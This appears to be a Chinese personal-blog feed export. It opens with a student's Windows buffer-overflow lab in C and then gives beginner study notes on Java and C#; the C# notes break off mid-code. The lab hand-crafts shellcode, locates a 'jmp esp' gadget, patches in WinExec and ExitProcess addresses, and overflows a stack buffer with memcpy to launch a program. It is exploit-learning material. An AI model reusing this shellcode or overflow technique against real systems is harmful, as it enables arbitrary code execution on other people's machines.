<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">char shellcode[]&#x3D;</span><br><span class="line">&#123; &#x2F;&#x2F;定义一个全局变量</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90,</span><br><span class="line">	0x90,0x90,0x90,0x90, &#x2F;&#x2F;0x34,0xFF,0x12,0x00,这里填的本来是一开始打开notepad的返回地址</span><br><span class="line">	0x90,0x90,0x90,0x90, &#x2F;&#x2F;24</span><br><span class="line">	0x90,0x90,0x90,</span><br><span class="line"></span><br><span class="line">	0x68,0x65,0x00,0x00,0x00,</span><br><span class="line">	0x68,0x6E,0x2E,0x65,0x78,</span><br><span class="line">	0x68,0x61,0x6F,0x72,0x61,</span><br><span class="line">	0x68,0x65,0x6E,0x67,0x68,</span><br><span class="line">	0x68,0x63,0x3A,0x2F,0x64, &#x2F;&#x2F;这一段是名字全拼.exe的十六进制编码</span><br><span class="line"></span><br><span class="line">	0x6A,0x01,0x8B, &#x2F;&#x2F;31</span><br><span class="line">	0xC4,0x83,0xC0,0x04,</span><br><span class="line">	0x50,0xB8,0x90,0x90,</span><br><span class="line">	0x90,0x90,0xFF,0xD0,</span><br><span class="line">	0x6A,0x00,0xB8,0x90,</span><br><span class="line">	0x90,0x90,0x90,0xFF,0xD0 &#x2F;&#x2F;21，两个0xFF前面四个字节都是相应的函数地址</span><br><span class="line">&#125;;</span><br><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    char buffer[10];</span><br><span class="line">    memcpy(buffer,shellcode,sizeof(shellcode)); &#x2F;&#x2F;memcpy缓冲区溢出常用函数，即大数据往小空间上拷贝</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	DWORD base &#x3D; 0x00400000;</span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		if (*(WORD*)base &#x3D;&#x3D; 0xe4ff) &#x2F;&#x2F;在本地查找0xE4FF,也就是jmp ESP指令的地址</span><br><span class="line">			break;</span><br><span class="line">		base ++;</span><br><span class="line">	&#125;</span><br><span class="line">	*(DWORD*)&amp;shellcode[16] &#x3D; base; &#x2F;&#x2F;保存到shellcode里面替换手动输入的返回地址</span><br><span class="line"></span><br><span class="line">	DWORD a1 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;WinExec&quot;);</span><br><span class="line">	DWORD a2 &#x3D; (DWORD)GetProcAddress(LoadLibrary(&quot;kernel32.dll&quot;),&quot;ExitProcess&quot;);</span><br><span class="line">	*(DWORD*)(shellcode+61) &#x3D; a1;</span><br><span class="line">	*(DWORD*)(shellcode+70) &#x3D; a2; &#x2F;&#x2F;动态获取，然后回填</span><br><span class="line">	test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个实验真的做的脑壳疼，本来人就菜，做这个还得东找西造，累的不要不要的。不过也坚定了我做东西要记录的想法，不然到时候真的记不住，太操蛋了-_^</p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Virus</tag>
      </tags>
  </entry>
  <entry>
    <title>Java从入门到入土</title>
    <url>/hexo-test/Information-Security-Study/Code-Language/Java/Java/</url>
    <content><![CDATA[<img data-src="/hexo-test/Information-Security-Study/Code-Language/Java/Java/OIP.jfif" class title="入土">
<a id="more"></a>
<h1 id="Java介绍"><a href="#Java介绍" class="headerlink" title="Java介绍"></a>Java介绍</h1><h2 id="Java常用概念"><a href="#Java常用概念" class="headerlink" title="Java常用概念"></a>Java常用概念</h2><p>网站=网页+后端服务器<br>Java靠JVM虚拟机实现跨平台，JVM本身不允许跨平台<br>编写代码（JRE，源文件）-&gt;编译代码（JDK翻译工具，.class字节码文件）-&gt;运行代码（JDK运行工具，JVM虚拟机）<br>类：Java文件在代码中的集合体现<br>类库：存放读个Java文件的仓库<br>核心类库：Java已经写好的，非常核心的，代码仓库<br>JDK：包含了代码的编译工具和运行工具<br><strong>pubilc class 类名：public 限定类名称与文件名保持一致</strong><br>public static void main(String[] args){}<br>//单行注释<br>/* 多行注释 <em>/<br>*</em>关键字**：被Java赋予了特定含义得英文单词</p>
<h2 id="面向对象和面向过程"><a href="#面向对象和面向过程" class="headerlink" title="面向对象和面向过程"></a>面向对象和面向过程</h2><p><strong>面向过程（Procedure Oriented Programming）</strong>：是一种以过程为中心的编程思想，实现功能的每一步，都是自己实现的</p>
<p><strong>面向对象编程（Object Oriented Programming）</strong>：是一种以对象为中心的编程思想，通过指挥对象实现具体的功能<br> 对象 ：指客观存在的事物</p>
<h2 id="面向对象三大特征之一（封装、继承、多态）"><a href="#面向对象三大特征之一（封装、继承、多态）" class="headerlink" title="面向对象三大特征之一（封装、继承、多态）"></a><strong>面向对象三大特征之一（封装、继承、多态）</strong></h2><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>隐藏实现细节，仅对外暴露公共的访问方式</p>
<p><strong>作用：</strong></p>
<ol>
<li>提高安全性</li>
<li>实现代码的组件化</li>
</ol>
<p><strong>规范：</strong></p>
<ol>
<li>建议成员变量都私有<br>private修饰的方法，成员变量，构造器等职能在本类被使用</li>
<li>提供成套的getter+setter方法暴露成员变量的取值和赋值<br>public修饰符，公开</li>
</ol>
<p><strong>核心思想：</strong><br>    合理隐藏，合理暴露</p>
<p>封装是Java代码的风格，机时代吗毫无意义，也仍然要这么写</p>
<h3 id="继承（extends）"><a href="#继承（extends）" class="headerlink" title="继承（extends）"></a>继承（extends）</h3><h2 id="常见关键字"><a href="#常见关键字" class="headerlink" title="常见关键字"></a>常见关键字</h2><p><strong>private关键字</strong> <strong>：</strong><br>    权限修饰符；可以用来修饰成员（变量、方法），限定成员只能在本类中访问；针对被修饰的成员变量，需要通过定制的方法进行赋值与访问 </p>
<p><strong>static关键字：</strong></p>
<p> <strong>this关键字 ：</strong><br>    调用本类的成员，解决局部变量和成员变量重名问题<br>    this代表所在类的对象引用，调用的是谁就是代表谁</p>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>整合多个条件语句</p>
<ul>
<li>&amp; 与（两个判断语句都会执行）</li>
<li>| 或</li>
<li>! 非</li>
<li>^ 异或</li>
<li>&amp;&amp; 短路与（当符号左边为false时，右边就不执行了）</li>
<li>|| 短路或 （当符号左边为true时，右边就不执行了）<br>三元运算符：<br>关系表达式 ? 表达式1 : 表达式2;（执行流程：当判断式为true时执行表达式1，反之则执行表达式2）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SanYuan</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">		<span class="keyword">int</span> h1 = <span class="number">150</span>,h2 = <span class="number">210</span>,h3 = <span class="number">165</span>;</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">int</span> tempH = (h1&gt; h2) ? h1 : h2;</span><br><span class="line">        </span><br><span class="line">		(tempH &gt; h3) ? tempH : h3; <span class="comment">//求取三个值中的最大值</span></span><br><span class="line">        </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>在switch语句中，如果case控制的语句体后面不写break，将会出现穿透现象（当case出现穿透，后续的switch语句将不会具有匹配效果，将会直接执行后续case语句中的代码，直至遇到break或者将switch中的代码执行完毕才会停止）</em></p>
<h1 id="IDEA-操作流程"><a href="#IDEA-操作流程" class="headerlink" title="IDEA 操作流程"></a>IDEA 操作流程</h1><p>项目 -&gt; module （一个模块中可以存放实现功能的代码，并使用包来管理类文件）-&gt; package（包） -&gt; class（类）    </p>
<ul>
<li>创建project项目<ul>
<li>创建module模块</li>
<li>创建package</li>
<li>创建class</li>
<li>编写代码</li>
<li>编译运行</li>
</ul>
</li>
</ul>
<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a><strong>快捷键</strong></h2><p>psvm+回车 ：快速生成main方法<br>sout + 回车 ：生成输出语句<br>alt + 1 ：打开\隐藏 工程目录结构<br>alt + 4 ：打开\隐藏 控制台<br>ctrl + alt + L ：格式化代码 （美化格式）<br>alt + enter ： 代码修正提示<br>Ctrl + D ：向下复制一行<br>Ctrl + X : 剪切当前行<br>Ctrl + / ：批量加入单行注释<br>Ctrl + shift + / ：批量加入多行注释<br>alt + shift + 向上方向键 ：上移当前行<br>alt + shift + 向下方向键 ：下移当前行</p>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组是一个容器，用来存贮同种数据类型或更小类型的多个值</p>
<h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><p>格式 ：int[] array | int array[]</p>
<p>打印数组名的时候，会打印出数组的内存地址</p>
<p>初始化 ：</p>
<ul>
<li><p>动态初始化：int[] = new int[5]，定义数组的长度（会自动增长），值由系统自定义</p>
</li>
<li><p>静态初始化：int[] array = new int[] { 1,2,3 }</p>
</li>
</ul>
<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><p>格式 ：数据类型[][] 变量名</p>
<ul>
<li>动态初始化 ：数据类型 变量名 = new 数据类型[m][n]</li>
<li>静态初始化 ：数据类型[][] 变量名 = new 数据类型[][]{ {元素1,元素2,…},{元素1,元素2,…},{元素1,元素2,…} }     数据类型[][] 变量名 = { {元素1,元素2,…},{元素1,元素2,…},{元素1,元素2,…} } </li>
</ul>
<h2 id="数组和集合的区别"><a href="#数组和集合的区别" class="headerlink" title="数组和集合的区别"></a>数组和集合的区别</h2><p>集合 ：提供了一种存储空间可变的储存模型，存储的数据容量可以发生改变</p>
<p>数组的容量是固定的，集合是可变的</p>
<h2 id="数组常见问题"><a href="#数组常见问题" class="headerlink" title="数组常见问题"></a>数组常见问题</h2><ul>
<li>索引访问越界 ：访问了数组未定义的索引</li>
<li>空指针异常 ：访问的数组已经不再指向堆内存中的数据，造成空指针异常</li>
</ul>
<p><strong>动态获取数组长度 ：array.Length</strong></p>
<h1 id="Java中内存分配"><a href="#Java中内存分配" class="headerlink" title="Java中内存分配"></a>Java中内存分配</h1><p>​    Java程序运行时，需要在内存中分配空间。为了提高运算效率，就对空间进行了不同区域的划分，每一片区域都有特定的数据处理方式和内存管理方式。</p>
<pre><code>* 栈内存 ：方法运行时进入的内存，局部变量都存放在这块内存中
* 堆内存 ：new出来的内容都会进入堆内存，并且会存在地址值（每new一次都会在堆内存中新开辟一块空间，不会出现重复现象，但是可以重复利用同一块地址）
* 方法区 ：字节码文件（.class文件）加载时进入的内存
* 本地方法栈 ：调用操作系统相关资源
* 寄存器 ：交给CPU区使用</code></pre><h1 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h1><pre><code>* 二进制 ：0b开头
* 八进制 ：0开头
* 十六进制 ：0x开头
* 输出其他进制的内容会被转换为10进制</code></pre><h2 id="原、反、补码"><a href="#原、反、补码" class="headerlink" title="原、反、补码"></a>原、反、补码</h2><ol>
<li>原码 ：即数据的二进制表示，最高位为符号位——0为正数，1为负数</li>
<li>反码 ：正数的反码与原码一致；负数的反码是对原码按位取反，但符号位不变</li>
<li>补码 ：正数的补码与原码一致；负数的补码是该数的反码加1</li>
<li><strong>计算机中的数据都是以二进制补码的形式在进行运算</strong></li>
</ol>
<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><ol>
<li>&amp;（与）：遇0则0</li>
<li>|（或）：遇1则1</li>
<li>^（异或）：相同则0，不同则1（一个数被同一个数异或两遍值不变）</li>
<li>~（取反）：全部取反，<strong>包括符号位</strong></li>
</ol>
<h2 id="位移运算符"><a href="#位移运算符" class="headerlink" title="位移运算符"></a>位移运算符</h2><ol>
<li>“&lt;&lt;” ：有符号左移运算，二进制向左移动，左边符号位丢弃，右边补0，左移多少位就乘以2的几次幂</li>
<li>“&gt;&gt;” ：有符号右移，使用符号位进行补位，向右移动几位就是除以2的几次幂</li>
<li>“&gt;&gt;&gt;” ：无符号右移，无论符号位是0还是1，都补0</li>
</ol>
<h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p> <strong>属性</strong> ：该事物的各种特征（各种标志）<br> <strong>行为</strong> ：该事物存在的功能（能够做的事情）<br><strong>类</strong> ：是对生活中一类具有共同特征的事物的抽象<br><strong>对象</strong> ：是能够看得到摸得着的真实存在的实体<br>    <strong><em>类是对象的描述，对象是类的实例</em></strong></p>
<h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a><strong>类的定义</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">* 类名 ：<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 类名（类名的首字母应该大写，<span class="title">ClassDemo</span>；在一个<span class="title">Java</span>代码文件中只能有一个用<span class="title">public</span>修饰的类）</span></span><br><span class="line">* 成员变量（Field: 描述类和对象的属性信息） ：数据类型 变量名;</span><br><span class="line">* 成员方法（Method: 描述类或者对象的行为信息） ：方法;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    <span class="comment">// 类中的五大成分</span></span><br><span class="line">	<span class="comment">// 1.成员变量（属性）</span></span><br><span class="line">	数据类型 变量名;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2.成员方法（行为）</span></span><br><span class="line">	方法;</span><br><span class="line">    <span class="comment">// 3.构造器 （初始化类的对象数据的）</span></span><br><span class="line">    <span class="comment">// 4.内部类</span></span><br><span class="line">    <span class="comment">// 5.代码块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 1.成员变量</span></span><br><span class="line">	<span class="keyword">public</span> String name ;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">char</span> sex ;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span> age ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="对象的创建与使用"><a href="#对象的创建与使用" class="headerlink" title="对象的创建与使用"></a>对象的创建与使用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// **创建对象** ：</span></span><br><span class="line">类名 对象名 = <span class="keyword">new</span> 类名();	<span class="comment">//Scanner sc = new Scanner();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//**使用对象** ：</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用成员变量 ：</span></span><br><span class="line">对象名.变量名（sc.value）</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//使用成员方法 ：</span></span><br><span class="line">对象名.方法名()（sc.nextInt()）</span><br></pre></td></tr></table></figure>




<p>​        </p>
<h1 id="方法（类似函数）"><a href="#方法（类似函数）" class="headerlink" title="方法（类似函数）"></a>方法（类似函数）</h1><ul>
<li>方法就是一段具有独立功能的代码，不调用就不执行</li>
<li>为什么要有方法 ：提高代码的复用性</li>
<li>方法必须先创建才可以使用，该过程称为方法定义</li>
<li>方法创建过后并不是直接运行的，需要手动使用后才执行，该过程称为方法调用</li>
</ul>
<h2 id="方法定义（跟main同级，不能嵌套定义）"><a href="#方法定义（跟main同级，不能嵌套定义）" class="headerlink" title="方法定义（跟main同级，不能嵌套定义）"></a>方法定义（跟main同级，不能嵌套定义）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> 方法名()&#123;</span><br><span class="line">	code ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> 方法名(数据类型 变量名,.....)&#123;</span><br><span class="line">	code ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="构造方法（构造器，Constructor）"><a href="#构造方法（构造器，Constructor）" class="headerlink" title="构造方法（构造器，Constructor）"></a>构造方法（构造器，Constructor）</h2><p>当构建、创造对象的时候，所调用的方法；初始化一个类的对象并返回引用</p>
<p>方法名需要跟类名相同，大小写也要一致</p>
<ul>
<li>没有返回值类型，连void也没有</li>
<li>没有具体的返回值（不能由return带回具体的结果）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">classname</span><span class="params">()</span></span>&#123;</span><br><span class="line">    code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>构造方法的注意事项</strong> ：</p>
<ul>
<li>创建 ：如果没有定义构造方法，系统会提供一个默认的无参数构造方法；反之则不会提供默认的构造方法</li>
<li>重载 ：如果定义了带参构造方法，要使用无参方法，那么需要重新编写一个无参方法</li>
</ul>
<p>Javabean类 ：封装数据</p>
<h2 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方法名();</span><br><span class="line"></span><br><span class="line">方法名(数据);（**需要用变量来接收返回的值**）</span><br></pre></td></tr></table></figure>

<h2 id="方法调用过程"><a href="#方法调用过程" class="headerlink" title="方法调用过程"></a>方法调用过程</h2><ul>
<li>没有被调用的时候，在方法区中的字节码文件（.class）总储存</li>
<li>调用时进入栈内存中运行</li>
</ul>
<p>形参和实参 ：</p>
<ul>
<li>形参 ：形式参数，是指方法定义中的参数</li>
<li>实参 ：实际参数，方法调用时的参数</li>
</ul>
<h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p>​    方法名相同，参数也完全相同，称为方法的重复定义，是一种冲突性的错误；在调用方法时，Java虚拟机会通过参数的不同来区分同名的方法</p>
<pre><code>* 在同一个类中，定义了多个同名的方法，但每个方法具有不同的参数类型（数据类型）或参数个数，这些同名的方法，就构成了重载关系。
* 参数不同 ：个数不同、类型不同、顺序不同
* 识别方法之间是否为重载关系，只看方法名和参数，与返回值无关</code></pre><h1 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h1><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a><strong>常量</strong></h2><p>代码执行过程中其值不会发生变化的量</p>
<ul>
<li><p>空常量（null）不能被输出打印字符</p>
</li>
<li><p>常量：单引号括起来的数据，只能包含单个字符</p>
</li>
</ul>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a><strong>变量</strong></h2><p>内存总存储数据的空间，空间存储着不断发生变化的数据，定义变量即在内存中申请一个空间</p>
<p><strong>== 作比较 ：</strong><br><strong>基本类型 ：比较数据值是否相同</strong><br><strong>引用类型 ：比较地址值是否相同</strong></p>
<p><em>变量类型 变量名 = 值;</em></p>
<p><strong>标识符</strong>：给类、方法、变量等起名字的字符</p>
<ul>
<li><p>由数字、字母、下划线_、和$组成</p>
</li>
<li><p>不能是数字开头</p>
</li>
<li><p>不能是关键字</p>
</li>
<li><p>区分大小写</p>
</li>
</ul>
<p><strong>定义float时需要在数值后面加上F(f)，定义long类型时需要加上L(l)</strong></p>
<h3 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a><strong>变量的作用域</strong></h3><p>只在他所在的大括号内有效｛当大括号内部代码执行完毕后，内部所定义的变量将从内存中移除｝<br>计算机中存储的最小信息单元是位（bit）最小的存储单元是字节（byte）<br>1 byte = 8 bit</p>
<h3 id="成员变量和局部变量"><a href="#成员变量和局部变量" class="headerlink" title="成员变量和局部变量"></a>成员变量和局部变量</h3><ul>
<li>成员变量 ：类中方法外（一个类中的全局变量）；在堆内存中；生命周期跟整个对象相同；有默认的初始化值</li>
<li>局部变量 ：方法中的局部变量；在栈内存中；声明周期跟所属的方法相同；没有默认的初始化值，必须先定义赋值才能使用</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Modeus</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">		Scanner sc = <span class="keyword">new</span> Scanner(System.in); <span class="comment">//创建对象</span></span><br><span class="line">		<span class="keyword">int</span> a = sc.nextInt(); <span class="comment">//接收输入</span></span><br><span class="line">		</span><br><span class="line">		System.out.println(); <span class="comment">//输出</span></span><br><span class="line">		<span class="keyword">byte</span> d = <span class="number">3</span> + <span class="number">4</span>; <span class="comment">// 不会报错，Java存在常量优化机制，会在编译时让3、4相加，并判断是否在byte取值范围内，不在则报错，在则通过编译</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>C＃学习笔记</title>
    <url>/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>C#程是利用命名空间组织起来的。如果要调用某个命名空间的额类或者方法，则需要用 using 引入命名空间<br>    *using 指令的基本形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using 命名空间名;*</span><br></pre></td></tr></table></figure>
<p>当使用命名空间内的类时 （如一个N1的命名空间有一个类A中有一个方法Myls），需要实例化这个类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*A oa &#x3D; new A();		&#x2F;&#x2F;实例化类</span><br><span class="line">oa.Myls();		&#x2F;&#x2F;调用类A中的Myls方法*</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using N1;	&#x2F;&#x2F;使用using指令引入命名空间N1</span><br><span class="line">namespace Test02</span><br><span class="line">&#123;</span><br><span class="line">	class Program</span><br><span class="line">	&#123;</span><br><span class="line">		static void Main(string[] args)</span><br><span class="line">		&#123;</span><br><span class="line">			A oa &#x3D; new A();</span><br><span class="line">			oa.Myls();</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace N1		&#x2F;&#x2F;建立命名空间 N1</span><br><span class="line">&#123;</span><br><span class="line">	class A		&#x2F;&#x2F;在N1中声明一个类A</span><br><span class="line">	&#123;</span><br><span class="line">		public void Myls()</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine (&quot;...&quot;);		&#x2F;&#x2F;C#中输出字符串</span><br><span class="line">			Console.ReadLine();		&#x2F;&#x2F;等待输入</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>类是一种数据结构，他可以封装数据成员、函数成员和其他的类。C#中的所有语句都必须位于类内。使用任何新的类之前都必须声明它，一个类一旦被声明，就可以当做一种新的类型来使用。在C#中通过class关键字来声明。<br>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class MyClass</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h2><img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Main1.png" class>


<h2 id="标识符及关键字"><a href="#标识符及关键字" class="headerlink" title="标识符及关键字"></a>标识符及关键字</h2><p>标识符命名规则：<br>要注意的是C#的标识符只能由数字、字母和下划线组成，并且必须以字符或者下划线开头。<font color="red">在对类、变量、方法等进行命名时，应避免与标识符和关键字重名，否则可能导致所编写的程序中响应的引用出现未知的错误。</font></p>
<h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><p>C#中变量的类型分为值类型和引用类型两类，如同C语言一般，C#的值类型变量也分为整数类型、浮点类型和布尔类型。</p>
<h3 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h3><p>1、整数类型</p>
<p> C#中的整数类型有sbyte、short、int、long、byte、ushort、uint、ulong<br><font color="green" size="1.5">其中值得注意的是：byte类型和short类型都是范围比较小的整数，如果正整数范围没有超过65535，声明为ushort类型即可，当数值适用于byte时要注意数值的大小，否则可能导致运算溢出的错误。</font></p>
<p>2、浮点类型</p>
<p>浮点类型主要用于处理含有小数的数值数据，浮点类型主要包含float和double两种数值类型。</p>
<ul>
<li><font color="red" size="1.5">如不作任何设置，则一切含有小数的数值都将被认为是double类型</font></li>
</ul>
<p>3、布尔类型</p>
<p>布尔类型主要用来表示true/false值，一个布尔型变量的值只能是true/false，不能将其他的值赋给布尔变量，也不能与其他的变量进行转换。</p>
<p>4、常量</p>
<p>利用const 关键字来创建常量，并在创建常量时设置它的初始值一旦设置就不再允许更改</p>
<p> 5、数值的强制转换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">float MySum &#x3D; 9.27f	&#x2F;&#x2F;使用f强制指定为float类型</span><br><span class="line">double MyDou &#x3D; 927d	&#x2F;&#x2F;使用d强制指定为double类型</span><br><span class="line">double x &#x3D; 19835.165;</span><br><span class="line">int y &#x3D; (int)x;		&#x2F;&#x2F;强制将double 类型的数转换成 int 类型</span><br><span class="line">也可以使用Convert关键字进行强制转换：</span><br><span class="line">int y &#x3D; Convert.ToInt32(x);</span><br></pre></td></tr></table></figure>
<ul>
<li>如果需要使用float类型的变量，必须在数值的后面紧跟f或F，否则编译器将将其作为double类型的变量处理，也可以在double类型变量的前面加上（float）对其进行强制转换。</li>
</ul>
<h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3> <img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.png" class title="引用类型">
 <img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B1.png" class title="引用类型">

<p>实例（创建一个类C，并在类中建立一个字段Value，并初始化为0。然后在程序的其他地方通过new创建该类的引用类型变量）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">	class C		&#x2F;&#x2F;创建一个类C</span><br><span class="line">	&#123;</span><br><span class="line">		public int Value &#x3D;0;		&#x2F;&#x2F;声明一个公共int类型的变量Value</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	static void Main (string[] args)</span><br><span class="line">	&#123;</span><br><span class="line">		int v1 &#x3D;0;		&#x2F;&#x2F;声明一个int类型变量v1，赋初值为0</span><br><span class="line">		int v2 &#x3D;v1;		&#x2F;&#x2F;声明一个int类型变量v2，并将v1的值赋给v2</span><br><span class="line">		v2 &#x3D; 927;		&#x2F;&#x2F;将v2的值更改为927</span><br><span class="line">		C r1 &#x3D; new C();		&#x2F;&#x2F;使用new关键字创建引用对象</span><br><span class="line">		C r2 &#x3D;r1;			&#x2F;&#x2F;是r1等于r2</span><br><span class="line">		r2.Value &#x3D; 112;		&#x2F;&#x2F;设置r2的Value值</span><br><span class="line">		Console.WriteLine(“Value:&#123;0&#125;,&#123;1&#125;”,v1,v2);		&#x2F;&#x2F;输出v1和v2</span><br><span class="line">		Console.WriteLine(“Refs:&#123;0&#125;,&#123;1&#125;”,r1.Value,r2.Value);		&#x2F;&#x2F;输出引用类型对象的Value值</span><br><span class="line">		Console.ReadLine();</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E5%AE%9E%E4%BE%8B%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" class title="结果">

<h3 id="值类型和引用类型的区别"><a href="#值类型和引用类型的区别" class="headerlink" title="值类型和引用类型的区别"></a>值类型和引用类型的区别</h3><p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApp1_Cxiapu</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">		class Program</span><br><span class="line">		&#123;</span><br><span class="line">			static void Main(string[] args)</span><br><span class="line">			&#123;</span><br><span class="line">				ReferenceAndValue.Demonstration();      &#x2F;&#x2F;调用类中的方法</span><br><span class="line">				Console.ReadLine();</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public class stamp</span><br><span class="line">		&#123;</span><br><span class="line">			public string Name &#123; get; set; &#125;        &#x2F;&#x2F;定义引用类型</span><br><span class="line">			